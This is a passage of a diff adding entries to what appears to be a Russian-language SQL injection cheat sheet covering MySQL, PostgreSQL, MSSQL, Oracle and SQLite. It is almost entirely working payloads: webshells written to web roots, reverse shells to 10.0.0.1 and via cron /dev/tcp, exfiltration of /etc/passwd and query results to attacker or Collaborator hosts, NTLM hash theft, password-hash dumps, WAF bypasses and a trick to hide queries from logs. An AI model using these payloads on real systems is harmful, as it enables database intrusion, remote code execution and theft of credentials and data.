+      "language": "sql",
+      "tags": ["stacked", "methodology"],
+      "body": "-- Несколько запросов через ; (поддерживают не все СУБД/драйверы)\n1; EXEC xp_cmdshell('whoami') --\n\n-- MSSQL\nProductID=1; DROP members--\n\n-- PostgreSQL\nSELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--"
+    },
+    {
+      "subcategory": "Stacked queries",
+      "title": "MSSQL stacked — без терминатора",
+      "language": "sql",
+      "tags": ["stacked", "mssql"],
+      "body": "-- несколько SELECT подряд\nSELECT 'A'SELECT 'B'SELECT 'C'\n\n-- смена пароля\nSELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--\n\n-- включение xp_cmdshell\nSELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--"
+    },
+    {
+      "subcategory": "MySQL",
+      "title": "MySQL — комментарии",
+      "language": "table",
+      "tags": ["mysql", "comments"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Тип", "Описание"],
+          "rows": [
+            ["#", "Hash-комментарий"],
+            ["/* ... */", "C-style комментарий"],
+            ["/*! ... */", "Special SQL (исполняется)"],
+            ["/*!32302 ... */", "Комментарий для версии MySQL 3.23.02"],
+            ["--", "SQL-комментарий"],
+            [";%00", "Nullbyte"],
+            ["`", "Backtick"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "MySQL",
+      "title": "MySQL — тест инъекции (строка/число)",
+      "language": "sql",
+      "tags": ["mysql", "detection"],
+      "body": "-- строка: SELECT * FROM Table WHERE id = 'FUZZ';\n'      False\n''     True\n\\      False\n\\\\     True\n\n-- число: SELECT * FROM Table WHERE id = FUZZ;\nAND 1      True\nAND 0      False\n1-false    -> 1 если уязвимо\n1*56       -> 56 если уязвимо"
+    },
+    {
+      "subcategory": "MySQL",
+      "title": "MySQL — чтение файла (LOAD_FILE)",
+      "language": "sql",
+      "tags": ["mysql", "file-read"],
+      "body": "UNION ALL SELECT LOAD_FILE('/etc/passwd') --\nUNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));\n\n-- если root на БД, переоткрыть LOAD_FILE:\nGRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#"
+    },
+    {
+      "subcategory": "MySQL",
+      "title": "MySQL — webshell через INTO OUTFILE",
+      "language": "sql",
+      "tags": ["mysql", "rce", "webshell", "file-write"],
+      "body": "[...] UNION SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\"\n[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'\n[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\\\wamp\\\\www\\\\pwnd.php'-- -\n[...] union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'"
+    },
+    {
+      "subcategory": "MySQL",
+      "title": "MySQL — webshell через INTO DUMPFILE",
+      "language": "sql",
+      "tags": ["mysql", "rce", "webshell", "file-write"],
+      "body": "[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'\n[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';"
+    },
+    {
+      "subcategory": "MySQL",
+      "title": "MySQL — RCE через UDF (sys_exec/sys_eval)",
+      "language": "sql",
+      "tags": ["mysql", "rce", "udf"],
+      "body": "-- проверить наличие библиотеки:\n-- $ whereis lib_mysqludf_sys.so  →  /usr/lib/lib_mysqludf_sys.so\n\nSELECT sys_eval('id');\nSELECT sys_exec('id');"
+    },
+    {
+      "subcategory": "MySQL",
+      "title": "MySQL — INSERT через ON DUPLICATE KEY UPDATE",
+      "language": "sql",
+      "tags": ["mysql", "insert", "auth-bypass"],
+      "body": "-- меняем пароль админа при INSERT\nattacker_dummy@example.com\", \"P@ssw0rd\"), (\"admin@example.com\", \"P@ssw0rd\") ON DUPLICATE KEY UPDATE password=\"P@ssw0rd\" --"
+    },
+    {
+      "subcategory": "MySQL",
+      "title": "MySQL — Truncation Attack",
+      "language": "sql",
+      "tags": ["mysql", "truncation", "auth-bypass"],
+      "body": "-- При varchar(20) лишние символы и хвостовые пробелы обрезаются → \"admin\" и \"admin   \" эквивалентны.\n-- username varchar(20) not null\nusername = \"admin               a\""
+    },
+    {
+      "subcategory": "MySQL",
+      "title": "MySQL — DIOS (Dump In One Shot)",
+      "language": "sql",
+      "tags": ["mysql", "dios", "exfiltration"],
+      "body": "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#\n\n-- SecurityIdiots\nmake_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)"
+    },
+    {
+      "subcategory": "MySQL",
+      "title": "MySQL — текущие запросы (PROCESSLIST)",
+      "language": "sql",
+      "tags": ["mysql", "enumeration"],
+      "body": "SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;\nUNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #"
+    },
+    {
+      "subcategory": "MySQL",
+      "title": "MySQL — DNS-эксфильтрация (OOB)",
+      "language": "sql",
+      "tags": ["mysql", "oob", "exfiltration"],
+      "body": "SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.hacker.site\\\\a.txt'));\nSELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))"
+    },
+    {
+      "subcategory": "MySQL",
+      "title": "MySQL — кража NTLM-хеша (UNC path)",
+      "language": "sql",
+      "tags": ["mysql", "oob", "ntlm", "windows"],
+      "body": "SELECT LOAD_FILE('\\\\\\\\error\\\\abc');\nSELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);\nSELECT '' INTO DUMPFILE '\\\\\\\\error\\\\abc';\nSELECT '' INTO OUTFILE '\\\\\\\\error\\\\abc';\nLOAD DATA INFILE '\\\\\\\\error\\\\abc' INTO TABLE DATABASE.TABLE_NAME;"
+    },
+    {
+      "subcategory": "PostgreSQL",
+      "title": "PostgreSQL — enumeration",
+      "language": "table",
+      "tags": ["postgresql", "enumeration"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Описание", "SQL"],
+          "rows": [
+            ["Версия СУБД", "SELECT version()"],
+            ["Имя БД", "SELECT CURRENT_DATABASE()"],
+            ["Список пользователей", "SELECT usename FROM pg_user"],
+            ["Хеши паролей", "SELECT usename, passwd FROM pg_shadow"],
+            ["Администраторы БД", "SELECT usename FROM pg_user WHERE usesuper IS TRUE"],
+            ["Текущий пользователь", "SELECT current_user;"],
+            ["Список таблиц", "SELECT table_name FROM information_schema.tables"],
+            ["Список колонок", "SELECT column_name FROM information_schema.columns WHERE table_name='data_table'"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "PostgreSQL",
+      "title": "PostgreSQL — чтение файла",
+      "language": "sql",
+      "tags": ["postgresql", "file-read"],
+      "body": "-- pg_read_file / pg_ls_dir\nselect pg_ls_dir('./');\nselect pg_read_file('PG_VERSION', 0, 200);\n\n-- COPY\nCREATE TABLE temp(t TEXT);\nCOPY temp FROM '/etc/passwd';\nSELECT * FROM temp limit 1 offset 0;\n\n-- lo_import\nSELECT lo_import('/etc/passwd');\nSELECT lo_get(16420);"
+    },
+    {
+      "subcategory": "PostgreSQL",
+      "title": "PostgreSQL — запись файла (COPY)",
+      "language": "sql",
+      "tags": ["postgresql", "file-write"],
+      "body": "CREATE TABLE nc (t TEXT);\nINSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');\nSELECT * FROM nc;\nCOPY nc(t) TO '/tmp/nc.sh';\n\n-- одной строкой\nCOPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';"
+    },
+    {
+      "subcategory": "PostgreSQL",
+      "title": "PostgreSQL — RCE через COPY ... TO/FROM PROGRAM",
+      "language": "sql",
+      "tags": ["postgresql", "rce"],
+      "body": "-- Postgres 9.3+ для superuser / pg_execute_server_program\nCOPY (SELECT '') TO PROGRAM 'getent hosts $(whoami).[BURP_COLLABORATOR_DOMAIN_CALLBACK]';\nCOPY (SELECT '') to PROGRAM 'nslookup [BURP_COLLABORATOR_DOMAIN_CALLBACK]'\n\nCREATE TABLE shell(output text);\nCOPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';"
+    },
+    {
+      "subcategory": "PostgreSQL",
+      "title": "PostgreSQL — RCE через libc.so.6",
+      "language": "sql",
+      "tags": ["postgresql", "rce"],
+      "body": "CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;\nSELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');"
+    },
+    {
+      "subcategory": "PostgreSQL",
+      "title": "PostgreSQL — выполнение команд (демо COPY PROGRAM)",
+      "language": "image",
+      "tags": ["postgresql", "rce"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/sql-injection/PostgreSQL_cmd_exec.png",
+        "caption": "Демонстрация RCE: CREATE TABLE cmd_exec, затем COPY cmd_exec FROM PROGRAM 'whoami' — в таблице появляется вывод команды (postgres). Источник: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "PostgreSQL",
+      "title": "PostgreSQL — OOB через COPY/nslookup",
+      "language": "sql",
+      "tags": ["postgresql", "oob", "exfiltration"],
+      "body": "declare c text;\ndeclare p text;\nbegin\nSELECT into p (SELECT YOUR-QUERY-HERE);\nc := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';\nexecute c;\nEND;\n$$ language plpgsql security definer;\nSELECT f();"
+    },
+    {
+      "subcategory": "PostgreSQL",
+      "title": "PostgreSQL — проверка superuser",
+      "language": "sql",
+      "tags": ["postgresql", "privileges"],
+      "body": "SHOW is_superuser; \nSELECT current_setting('is_superuser');\nSELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;"
+    },
+    {
+      "subcategory": "MSSQL",
+      "title": "MSSQL — enumeration",
+      "language": "table",
+      "tags": ["mssql", "enumeration"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Описание", "SQL"],
+          "rows": [
+            ["Версия СУБД", "SELECT @@version"],
+            ["Имя БД", "SELECT DB_NAME()"],
+            ["Схема", "SELECT SCHEMA_NAME()"],
+            ["Hostname", "SELECT @@SERVERNAME"],
+            ["Версия продукта", "SELECT SERVERPROPERTY('productversion')"],
+            ["Текущий пользователь", "SELECT CURRENT_USER"],
+            ["Текущий пользователь", "SELECT system_user;"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "MSSQL",
+      "title": "MSSQL — список БД / таблиц / колонок",
+      "language": "sql",
+      "tags": ["mssql", "enumeration"],
+      "body": "-- базы\nSELECT name FROM master..sysdatabases;\nSELECT name FROM master.sys.databases;\n\n-- таблицы (xtype='U' — user table, 'V' — views)\nSELECT name FROM master..sysobjects WHERE xtype = 'U';\nSELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'\n\n-- колонки\nSELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');\nSELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)"
+    },
+    {
+      "subcategory": "MSSQL",
+      "title": "MSSQL — чтение файла (OPENROWSET BULK)",
+      "language": "sql",
+      "tags": ["mssql", "file-read"],
+      "body": "-- нужно ADMINISTER BULK OPERATIONS\nOPENROWSET(BULK 'C:\\path\\to\\file', SINGLE_CLOB)\n\n-- пример\n-1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null"
+    },
+    {
+      "subcategory": "MSSQL",
+      "title": "MSSQL — RCE через xp_cmdshell",
+      "language": "sql",
+      "tags": ["mssql", "rce", "xp_cmdshell"],
+      "body": "EXEC xp_cmdshell \"net user\";\nEXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';\nEXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';"
+    },
+    {
+      "subcategory": "MSSQL",
+      "title": "MSSQL — включить xp_cmdshell",
+      "language": "sql",
+      "tags": ["mssql", "rce", "xp_cmdshell"],
+      "body": "-- включить расширенные опции\nEXEC sp_configure 'show advanced options',1;\nRECONFIGURE;\n\n-- включить xp_cmdshell\nEXEC sp_configure 'xp_cmdshell',1;\nRECONFIGURE;"
+    },
+    {
+      "subcategory": "MSSQL",
+      "title": "MSSQL — RCE через Python (external script)",
+      "language": "sql",
+      "tags": ["mssql", "rce", "python"],
+      "body": "EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"getpass\").getuser())'\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"os\").system(\"whoami\"))'\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open(\"C:\\\\inetpub\\\\wwwroot\\\\web.config\", \"r\").read())'"
+    },
+    {
+      "subcategory": "MSSQL",
+      "title": "MSSQL — кража NTLM-хеша (UNC / xp_dirtree)",
+      "language": "sql",
+      "tags": ["mssql", "oob", "ntlm", "windows"],
+      "body": "1'; use master; exec xp_dirtree '\\\\10.10.10.10\\SHARE';-- \n\nxp_dirtree '\\\\10.10.10.10\\file'\nxp_fileexist '\\\\10.10.10.10\\file'\nBACKUP LOG [TESTING] TO DISK = '\\\\10.10.10.10\\file'\nBACKUP DATABASE [TESTING] TO DISK = '\\\\10.10.10.10\\file'"
+    },
+    {
+      "subcategory": "MSSQL",
+      "title": "MSSQL — DNS-эксфильтрация (OOB)",
+      "language": "sql",
+      "tags": ["mssql", "oob", "exfiltration"],
+      "body": "-- VIEW SERVER STATE\n1 and exists(select * from fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\\1.xem',null,null))\n\n-- CONTROL SERVER\n1 and exists(select * from fn_trace_gettable('\\\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\\1.trc',default))"
+    },
+    {
+      "subcategory": "MSSQL",
+      "title": "MSSQL — Trusted Links (linked servers)",
+      "language": "sql",
+      "tags": ["mssql", "trusted-links", "lateral-movement"],
+      "body": "-- найти линки\nselect * from master..sysservers\n\n-- выполнить запрос через линк\nselect * from openquery(\"dcorp-sql1\", 'select * from master..sysservers')\nselect version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")')\n\n-- включить xp_cmdshell и выполнить команду через линк\nEXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer\nselect 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"')"
+    },
+    {
+      "subcategory": "MSSQL",
+      "title": "MSSQL — привилегии и DBA",
+      "language": "sql",
+      "tags": ["mssql", "privileges"],
+      "body": "-- эффективные права\nSELECT * FROM fn_my_permissions(NULL, 'SERVER'); \nSELECT * FROM fn_my_permissions (NULL, 'DATABASE');\n\n-- членство в роли\nSELECT is_srvrolemember('sysadmin');\n\n-- сделать пользователя sysadmin\nEXEC master.dbo.sp_addsrvrolemember 'User', 'sysadmin';"
+    },
+    {
+      "subcategory": "MSSQL",
+      "title": "MSSQL — хеши паролей",
+      "language": "sql",
+      "tags": ["mssql", "credentials", "hash"],
+      "body": "-- MSSQL 2000 (Hashcat mode 131)\nSELECT name, password FROM master..sysxlogins\nSELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins \n\n-- MSSQL 2005 (Hashcat mode 132)\nSELECT name, password_hash FROM master.sys.sql_logins\nSELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins"
+    },
+    {
+      "subcategory": "MSSQL",
+      "title": "MSSQL — OPSEC (скрыть запрос из логов)",
+      "language": "text",
+      "tags": ["mssql", "opsec"],
+      "body": "Добавь sp_password в запрос — он маскируется в логах:\n  ' AND 1=1--sp_password\n\nВ логе:\n  -- 'sp_password' was found in the text of this event.\n  -- The text has been replaced with this comment for security reasons."
+    },
+    {
+      "subcategory": "Oracle",
+      "title": "Oracle — enumeration",
+      "language": "table",
+      "tags": ["oracle", "enumeration"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Описание", "SQL"],
+          "rows": [
+            ["Версия СУБД", "SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';"],
+            ["Версия СУБД", "SELECT version FROM v$instance;"],
+            ["Hostname", "SELECT UTL_INADDR.get_host_name FROM dual;"],
+            ["Имя БД", "SELECT global_name FROM global_name;"],
+            ["Имя БД", "SELECT SYS.DATABASE_NAME FROM DUAL;"],
+            ["Схема", "SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Oracle",
+      "title": "Oracle — список БД / таблиц / колонок",
+      "language": "sql",
+      "tags": ["oracle", "enumeration"],
+      "body": "-- базы (владельцы)\nSELECT DISTINCT owner FROM all_tables;\n\n-- таблицы\nSELECT table_name FROM all_tables;\nSELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';\n\n-- колонки\nSELECT column_name FROM all_tab_columns WHERE table_name = 'blah';\nSELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'"
+    },
+    {
+      "subcategory": "Oracle",
+      "title": "Oracle — учётные данные",
+      "language": "table",
+      "tags": ["oracle", "credentials"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Query", "Описание"],
+          "rows": [
+            ["SELECT username FROM all_users;", "Доступно во всех версиях"],
+            ["SELECT name, password from sys.user$;", "Привилегированно, <= 10g"],
+            ["SELECT name, spare4 from sys.user$;", "Привилегированно, <= 11g"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Oracle",
+      "title": "Oracle — OOB через XXE (EXTRACTVALUE)",
+      "language": "sql",
+      "tags": ["oracle", "oob", "xxe", "exfiltration"],
+      "body": "SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual"
+    },
+    {
+      "subcategory": "Oracle",
+      "title": "Oracle — RCE через Java (DBMS_JAVA)",
+      "language": "sql",
+      "tags": ["oracle", "rce", "java"],
+      "body": "-- 10g R2, 11g R1/R2\nSELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\\\windows\\\\system32\\\\cmd.exe','/c', 'dir >c:\\test.txt') FROM DUAL\nSELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual\n\n-- 11g R1/R2\nSELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL"
+    },
+    {
+      "subcategory": "Oracle",
+      "title": "Oracle — RCE через DBMS_SCHEDULER",
+      "language": "sql",
+      "tags": ["oracle", "rce"],
+      "body": "DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)"
+    },
+    {
+      "subcategory": "Oracle",
+      "title": "Oracle — чтение/запись файла (UTL_FILE)",
+      "language": "sql",
+      "tags": ["oracle", "file-read", "file-write"],
+      "body": "-- ВНИМАНИЕ: только в stacked query\n\n-- чтение\nutl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)\n\n-- запись\nutl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)"
+    },
+    {
+      "subcategory": "SQLite",
+      "title": "SQLite — извлечение структуры",
+      "language": "table",
+      "tags": ["sqlite", "enumeration"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Описание", "SQL"],
+          "rows": [
+            ["Версия", "select sqlite_version();"],
+            ["Структура БД", "SELECT sql FROM sqlite_master"],
+            ["Имена таблиц", "SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'"],
+            ["Имена колонок", "SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'"],
+            ["Имена колонок", "SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');"],
+            ["Имена колонок", "SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "SQLite",
+      "title": "SQLite — RCE через ATTACH DATABASE (webshell)",
+      "language": "sql",
+      "tags": ["sqlite", "rce", "webshell", "file-write"],
+      "body": "ATTACH DATABASE '/var/www/shell.php' AS shell;\nCREATE TABLE shell.pwn (dataz text);\nINSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET[\"cmd\"]); ?>');--"
+    },
+    {
+      "subcategory": "SQLite",
+      "title": "SQLite — ATTACH DATABASE, важный нюанс",
+      "language": "text",
+      "tags": ["sqlite", "rce", "webshell"],
+      "body": "SQLite допишет magic-байты в начало файла (5351 4c69 7465 2066 6f72 6d61 7420 3300 = \"SQLite format 3\"). Это ломает большинство серверных скриптов, НО PHP терпим: пока в файле где-то есть тег <?php, интерпретатор игнорирует мусор перед ним и выполняет код.\n\nЕсли PHP залить нельзя, но сервис работает от root — тем же приёмом пишем cron-задачу с reverse shell:\n  ATTACH DATABASE '/etc/cron.d/pwn.task' AS cron;\n  CREATE TABLE cron.tab (dataz text);\n  INSERT INTO cron.tab (dataz) VALUES (char(10) || '* * * * * root bash -i >& /dev/tcp/127.0.0.1/4242 0>&1' || char(10));--"
+    },
+    {
+      "subcategory": "SQLite",
+      "title": "SQLite — load_extension / запись файла",
+      "language": "sql",
+      "tags": ["sqlite", "rce", "file-write"],
+      "body": "-- load_extension (по умолчанию выключено)\nSELECT load_extension('\\\\evilhost\\evilshare\\meterpreter.dll','DllMain');--\n\n-- запись файла\nSELECT writefile('/path/to/file', column_name) FROM table_name"
+    },
+    {
+      "subcategory": "WAF Bypass",
+      "title": "Обход без пробелов — альтернативный whitespace",
+      "language": "table",
+      "tags": ["waf-bypass", "no-space"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Payload", "Описание"],
+          "rows": [
+            ["?id=1%09and%091=1%09--", "%09 = tab (\\t)"],
+            ["?id=1%0Aand%0A1=1%0A--", "%0A = line feed (\\n)"],
+            ["?id=1%0Band%0B1=1%0B--", "%0B = vertical tab"],
+            ["?id=1%0Cand%0C1=1%0C--", "%0C = form feed"],
+            ["?id=1%0Dand%0D1=1%0D--", "%0D = carriage return (\\r)"],
+            ["?id=1%A0and%A01=1%A0--", "%A0 = non-breaking space"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "WAF Bypass",
+      "title": "Обход без пробелов — комментарии и скобки",
+      "language": "table",
+      "tags": ["waf-bypass", "no-space"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Bypass", "Техника"],
+          "rows": [
+            ["?id=1/*comment*/AND/**/1=1/**/--", "Комментарий"],
+            ["?id=1/*!12345UNION*//*!12345SELECT*/1--", "Условный комментарий"],
+            ["?id=(1)and(1)=(1)--", "Скобки"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "WAF Bypass",
+      "title": "Обход без запятых",
+      "language": "table",
+      "tags": ["waf-bypass", "no-comma"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Запрещено", "Bypass"],
+          "rows": [
+            ["LIMIT 0,1", "LIMIT 1 OFFSET 0"],
+            ["SUBSTR('SQL',1,1)", "SUBSTR('SQL' FROM 1 FOR 1)"],
+            ["SELECT 1,2,3,4", "UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "WAF Bypass",
+      "title": "Обход без знака равно",
+      "language": "table",
+      "tags": ["waf-bypass", "no-equal"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Bypass", "Пример"],
+          "rows": [
+            ["LIKE", "SUBSTRING(VERSION(),1,1)LIKE(5)"],
+            ["NOT IN", "SUBSTRING(VERSION(),1,1)NOT IN(4,3)"],
+            ["IN", "SUBSTRING(VERSION(),1,1)IN(4,3)"],
+            ["BETWEEN", "SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "WAF Bypass",
+      "title": "Обход — замена операторов/ключевых слов",
+      "language": "table",
+      "tags": ["waf-bypass", "keywords"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Запрещено", "Bypass"],
+          "rows": [
+            ["AND", "&&"],
+            ["OR", "||"],
+            ["=", "LIKE, REGEXP, BETWEEN"],
+            [">", "NOT BETWEEN 0 AND X"],
+            ["WHERE", "HAVING"],
+            ["AND (регистр)", "aNd (mixed case)"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "WAF Bypass",
+      "title": "MySQL — альтернативы information_schema / version",
+      "language": "sql",
+      "tags": ["waf-bypass", "mysql"],
+      "body": "-- вместо information_schema.tables\nSELECT * FROM mysql.innodb_table_stats;\nSHOW TABLES IN dvwa;\n\n-- вместо version()\nSELECT @@innodb_version;\nSELECT @@GLOBAL.VERSION;\n\n-- вместо group_concat() (MySQL >= 5.7.22, > 16M символов)\nSELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;"
+    },
+    {
+      "subcategory": "WAF Bypass",
+      "title": "MySQL — Scientific Notation (обход AWS WAF)",
+      "language": "sql",
+      "tags": ["waf-bypass", "mysql"],
+      "body": "-- e-нотация обфусцирует запрос\n-- ' or ''=' эквивалентно ' or 1.e('')='\n1' or 1.e(1) or '1'='1\n\nSELECT table_name FROM information_schema 1.e.tables\n\n1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2"
+    },
+    {
+      "subcategory": "WAF Bypass",
+      "title": "MySQL — Wide Byte Injection (GBK)",
+      "language": "sql",
+      "tags": ["waf-bypass", "mysql", "gbk", "encoding"],
+      "body": "-- При SET NAMES gbk байт %df «съедает» добавленный addslashes-бэкслеш:\n-- ?id=1%df'  →  SELECT * FROM users WHERE id='1連'' ...  (кавычка вырвалась)\n\n%A8%27 OR 1=1;--\n%8C%A8%27 OR 1=1--\n%bf' OR 1=1 -- --\n?id=1%df' and 1=1 --+"
+    },
+    {
+      "subcategory": "WAF Bypass",
+      "title": "PostgreSQL — альтернатива кавычкам",
+      "language": "table",
+      "tags": ["waf-bypass", "postgresql"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Payload", "Техника"],
+          "rows": [
+            ["SELECT CHR(65)||CHR(66)||CHR(67);", "Строка через CHR()"],
+            ["SELECT $TAG$This", "Dollar-quoting (PostgreSQL >= 8)"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "WAF Bypass",
+      "title": "Polyglot SQLi (time-based, мульти-контекст)",
+      "language": "sql",
+      "tags": ["waf-bypass", "polyglot", "time-based"],
+      "body": "SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/\nSELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR\"*/ FROM some_table WHERE ex = ample"
+    },
+    {
+      "subcategory": "PDO Prepared Statements",
+      "title": "PDO — инъекция в имени колонки",
+      "language": "text",
+      "tags": ["pdo", "php", "advanced"],
+      "body": "PDO с биндингом параметров всё равно уязвим, если ввод попадает в текст SQL: $pdo->prepare(\"SELECT $col FROM ...\").\n\nТребования:\n• MySQL уязвим по умолчанию; Postgres — только при PDO::ATTR_EMULATE_PREPARES => true; SQLite не уязвим.\n• В PHP 8.3 и ниже хватает протащить «:» или «?» (null-байт не нужен).\n\nДетект (?#\\0): GET /index.php?col=%3f%23%00&name=anything\n  → You have an error in your SQL syntax ... near '`'anything'#'\n\nЭксплуатация — инжект во второй параметр:\n  GET /index.php?col=%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+`'x`+from+information_schema.tables)y%3b%2523"
+    },
+    {
+      "subcategory": "SQLmap",
+      "title": "SQLmap — базовый запуск",
+      "language": "bash",
+      "tags": ["sqlmap", "tooling"],
